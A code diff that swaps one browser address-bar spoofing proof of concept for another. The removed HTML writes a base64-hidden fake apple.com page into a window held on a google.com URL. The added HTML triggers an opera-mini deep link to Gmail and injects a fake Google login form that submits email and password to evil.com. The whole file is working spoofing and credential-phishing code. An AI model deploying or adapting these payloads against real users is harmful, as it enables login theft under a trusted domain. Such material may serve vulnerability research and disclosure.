@@ -1,16 +1,33 @@
-<html>
-    <head>
-        <title>Address Bar Spoof!</title>
-    </head>
-    <body>
-        <script>
-            function demo() {
-            var evilPage = 'PGh0bWw+Cjx0aXRsZT5hcHBsZS5jb208L3RpdGxlPgo8Ym9keT4KPGgzIGlkPSJtc2ciPkhleSBhY2Nlc3MuYXBwbGUuY29tIGlzIG1vdmVkLCBjb3B5IHRoaXMgdG8geW91ciBhZGRyZXNzIGJhcjwvaDM+CjxzY3JpcHQ+CnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm1zZyIpLmlubmVySFRNTCA9ICJoYWhhaGEgdSBnb3QgZXZpbCBhcHBsZSI7Cn0sIDUwMDApOwo8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+';
-                var x = window.open('','');
-                setInterval(function(){x.location.replace('https://www.google.com:8080');});
-                x.document.write(atob(evilPage));
-            }
-        </script>
-        <button onclick="demo();">test</button>
-    </body>
-</html>
+<body>
+<style>
+#x{
+font-size:80px;
+margin-top: 50%;
+}
+input{
+font-size:50px;
+}
+</style>
+
+<center><h1 id=x></h1></center>
+
+<h1><a id=t onclick=v() href="opera-mini://open?url=https://mail.google.com/mail/u/1/checkbuild"></a>
+
+<script>
+
+function v(){
+x.innerHTML=`Welcome to  <span style='color: blue'>G</span>
+  <span style='color: red'>o</span>
+  <span style='color: yellow'>o</span>
+  <span style='color: blue'>g</span>
+  <span style='color: green'>l</span>
+  <span style='color: red'>e</span> Please Login below <br><br><form action=//evil.com><input placeholder=Email><br><input placeholder=Password type=password><br><br><input value=Login type=submit></form>`
+}
+setTimeout(()=>{
+t.click();
+}
+,100
+)
+</script>
+
+</body>
